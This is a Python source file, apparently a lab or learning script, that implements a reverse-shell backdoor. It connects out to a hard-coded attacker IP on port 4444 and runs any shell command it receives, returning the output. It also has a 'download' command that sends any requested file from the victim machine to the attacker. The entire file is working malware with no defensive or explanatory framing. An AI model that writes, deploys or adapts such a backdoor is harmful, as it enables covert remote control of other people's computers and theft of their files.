# backdoor.py
import socket
import subprocess
import os


# Function to execute system commands on the target machine
def execute_system_command(command):
    try:
        return subprocess.check_output(command, shell=True)
    except subprocess.CalledProcessError as e:
        return f"Error: {e}".encode()


# Function to handle file download (sending file to the attacker)
def send_file(conn):
    filename = conn.recv(1024).decode('utf-8')
    print(f"The Filename is: {filename}")
    if os.path.exists(filename):

        conn.send("File exists".encode('utf-8'))

        # Get the size of the file
        file_size = os.path.getsize(filename)
        print(f"Sending file: {filename} of size {file_size} bytes")

        # Send the file size to the server
        conn.sendall(str(file_size).encode('utf-8'))

        with open(filename, 'rb') as file:
            #conn.sendall('Start Downloading...').encode('utf-8')  # Notify the attacker that file transfer is starting
            print('Start Download...')
            chunk = file.read(1024)

            while chunk:
                conn.sendall(chunk)
                chunk = file.read(1024)
            #conn.sendall(b"END_FILE_TRANSFER")  # Notify the attacker that file transfer is complete
            print('File download success!')
            #conn.send(base64.b64encode("Success".encode('utf-8')))
            #conn.sendall('File Downloaded!').encode('utf-8')

        handle_commands(conn)
    else:
        print('File not Found!')
        conn.send("File not found".encode('utf-8'))
        handle_commands(conn)

    # After download is complete, call the `handle_commands` function again


# Function to handle all incoming commands in a loop
def handle_commands(conn):
    print('Handle Command')
    while True:
        try:
            # Receive the command sent from the attacker
            command = conn.recv(1024).decode('utf-8')

            # Exit condition
            if command.lower() == 'exit':
                break

            # Handle file download request
            elif command.lower()=='download':
                send_file(conn)  # Send the file to the attacker

            # For all other commands, execute and send result back to the attacker
            else:
                command_result = execute_system_command(command)
                conn.send(command_result)

        except Exception as e:
            conn.send(f"Error: {e}".encode())
            break

    # Close the connection when the loop exits
    conn.close()

# Establish connection to the attacker's machine
print('Connecting...')
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.199.133", 4444))  # Replace with your attacker's IP and port
print('Connected!')

# Start handling commands
handle_commands(connection)